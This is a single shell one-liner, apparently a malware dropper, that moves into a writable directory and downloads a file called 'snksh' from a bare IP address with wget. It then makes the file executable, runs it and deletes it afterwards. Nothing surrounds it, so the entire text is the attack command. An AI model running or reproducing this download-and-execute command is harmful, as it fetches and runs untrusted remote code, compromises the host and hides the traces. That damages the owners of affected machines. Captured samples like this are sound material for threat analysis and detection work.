cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.62.188.131/snksh; chmod +x snksh; ./snksh; rm -rf snksh
